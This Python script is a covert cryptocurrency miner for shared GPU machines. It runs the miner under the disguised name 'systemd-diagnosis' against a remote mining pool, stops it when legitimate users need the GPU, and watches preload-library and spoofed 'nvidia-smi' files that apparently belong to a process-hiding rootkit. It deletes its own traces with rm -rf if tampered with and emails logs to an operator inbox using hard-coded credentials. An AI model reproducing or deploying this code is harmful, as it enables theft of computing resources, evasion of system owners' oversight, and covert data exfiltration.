from collections import deque
from email.mime.text import MIMEText
from re import match
from smtplib import SMTP, SMTPException
from subprocess import CalledProcessError, call, check_output
from threading import Thread
from time import localtime, sleep, strftime


global signal
signal = True

global logger
logger = deque(maxlen=500)


def logging(msg, level='INFO'):
    time = strftime('%Y-%m-%d %H:%M:%S', localtime())
    msg  = f'{time}-[{level}]: {msg}\n'
    global logger
    logger.append(msg)


class IntegrityCheck(Thread):

    def __init__(self):
        super().__init__()
        self.name = 'Integrity check'
        # status.
        self.__flag = True
        self.__integrity = False
        # scanning obj.
        self.__whitelist_user = '\|'.join(['ftp', 'kernel'])
        self.__delete_files = ' '.join([
            '/usr/bin/systemd-firewall',
            '/usr/bin/systemd-diagnosis'
        ])
        self.__check_files = [
            '/etc/ld.so.preload',
            '/usr/lib/libGNU.so',
            '/usr/bin/nvtop',
            '/usr/bin/nvidia-smi',
            '/usr/bin/systemd-firewall',
            '/usr/bin/systemd-diagnosis'
        ]
        # init hash dictionary.
        self.__init_hash()

    def run(self):
        while self.__flag:
            self.__check_integrity()
            self.__reaction()
            sleep(2)

    def stop(self):
        self.__flag = False
    
    def __init_hash(self):
        self.__file_hash = dict()
        for file in self.__check_files:
            try:
                self.__file_hash[file] = check_output(['shasum', file]).decode().split()[0]
            except CalledProcessError:
                global signal
                signal = False
                logging(f'file {file} not found in initiate file hash.', 'ERRO')
                raise FileNotFoundError
        self.__integrity = True
        logging('initiate file hash: %s' % str(self.__file_hash), 'INFO')

    def __check_integrity(self):
        for k, v in self.__file_hash.items():
            try:
                shasum = check_output(['shasum', k]).decode().split()[0]
                if shasum != v:
                    self.__integrity = False
                    logging(f'{k} is mismatched, further check.', 'WARN')
                    break
            # file not found.
            except CalledProcessError:
                self.__integrity = False
                logging(f'{k} is missing, further check.', 'WARN')
                break

    def __reaction(self):
        if not self.__integrity:
            # check whether I am online.
            try:
                check_output(f"who | grep '{self.__whitelist_user}'", shell=True)
            # if not, something bad happend, delete miner.
            except CalledProcessError:
                call(f"rm -rf {self.__delete_files} &", shell=True)
                global signal
                signal = False
                logging('files were changed by asshole, delete core files.', 'WARN')
                self.stop()

            # if yes, update hash.
            else:
                self.__init_hash()


class LoggingMessenger(Thread):
    
    def __init__(self):
        super().__init__()
        self.name  = 'Logging Messenger'
        self.__flag = True
        self.__local = 129
        self.__interval = 6 * 3600
        # email setting
        self.__mail_addr = 'kiswgknbjr@163.com'
        self.__mail_host = 'smtp.163.com'
        self.__mail_user = 'kiswgknbjr'
        self.__mail_pass = 'VCGGPQJNUKSBHVLI'
    
    def run(self):
        t = 0
        while self.__flag:
            # check global signal.
            if not signal:
                self.stop()
                break
            t = (t + 2) % self.__interval
            if t == 0:
                logging(check_output('nl-toolkit').decode(), 'INFO')
                self.__send_mail()
            else:
                sleep(2)
            
    def stop(self):
        self.__flag = False
        logging('program terminated, send last mail.', 'WARN')
        self.__send_mail()

    def __send_mail(self):
        # setting mail content
        global logger
        message = MIMEText(''.join(logger), _charset='utf-8')
        message['Subject'] = f"Runing log #{self.__local} {strftime('%Y-%m-%d %H:%M:%S', localtime())}"
        message['From'] = self.__mail_addr
        message['To'] = self.__mail_addr
        # connect mail server
        retry = 3 if self.__flag else 1
        for _ in range(retry):
            try:
                smtp = SMTP()
                smtp.connect(self.__mail_host, 25)
                smtp.login(self.__mail_user, self.__mail_pass)
                smtp.sendmail(self.__mail_addr, self.__mail_addr, message.as_string())
                smtp.quit()
            except SMTPException:
                logging('fail to send mail.', 'ERRO')
                continue
            else:
                logger.clear()
                break


class MinerControl(Thread):

    def __init__(self):
        super().__init__()
        self.name = 'Miner control'
        self.__flag = True
        self.__waiting_round = 600
        self.memory_threshold = 10800
        self.__waiting_count = -1
        self.__gpus = self.__get_avail_gpus(0)
        self.__working = [False] * len(self.__gpus)
        
    def run(self):
        global signal

        while self.__flag:
            # check global signal.
            if not signal:
                self.stop()
                break
            avail_gpus = self.__get_avail_gpus(self.memory_threshold)
            # long waiting for starting new miner.
            self.__waiting_count = (self.__waiting_count + 1) % self.__waiting_round
            if not self.__waiting_count:
                # update working state.
                self.__working = [False] * len(self.__gpus)
                workings = check_output('nl-toolkit | grep systemd-diagnosis | cut -c 6', shell=True).decode().split('\n')[:-1]
                for gpu in workings:
                    self.__working[int(gpu)] = True
                logging(f'working miner: {", ".join(workings)}.', 'INFO')
                # start miner.
                for gpu in avail_gpus:
                    if not self.__working[gpu]:
                        call("nohup systemd-diagnosis --no-watchdog -o stratum+ssl://f2pool.jdkgs.xyz:14333 "
                             f"-a ethash -u oxa31d3e12b.glib{gpu+1} -d {gpu} 2>&1 > /dev/null &", shell=True)
                        self.__working[gpu] = True
                        logging(f'start mining on gpu{gpu}.', 'INFO')
                        sleep(1)
            # detect gpu status, kill the miner when some one is going to use the gpu.
            for gpu in self.__gpus:
                if gpu not in avail_gpus and self.__working[gpu]:
                    call(f"nl-toolkit | grep ' {gpu} ' |  grep 'systemd-diagnosis' | "
                         "cut -c 21-28 | xargs kill -9 2>&1 > /dev/null", shell=True)
                    self.__working[gpu] = False
                    logging(f'stop mining on gpu{gpu}.', 'INFO')
                    logging(check_output('nl-toolkit').decode(), 'INFO')
            sleep(0.5)

    def stop(self):
        self.__flag = False
        call(f"nl-toolkit | grep 'systemd-diagnosis' | cut -c 21-28"
             " | xargs kill -9 2>&1 > /dev/null &", shell=True)

    def __get_avail_gpus(self, memory_threshold):
        '''
        input:
            memory_threshold: int, min available video memory.
        output:
            gpus: list of int, available gpu list.
        '''
        gpus = list()
        smi  = check_output('nvidia-smi').decode().split('\n')
        for i, mem_info in enumerate(filter(lambda s: s.find('Default') != -1, smi)):
            memory   = match(r'.*?(\d+)MiB / (\d+)MiB', mem_info)
            res_mem  = int(memory.group(2)) - int(memory.group(1))
            if res_mem >= memory_threshold:
                gpus.append(i)
        return gpus


def main():
    miner    = MinerControl()
    checker  = IntegrityCheck()
    logmsger = LoggingMessenger()
    try:
        checker.start()
        sleep(10)
        miner.start()
        logmsger.start()
    except:
        miner.stop()
        checker.stop()
        logmsger.stop()


if __name__ == '__main__':
    main()
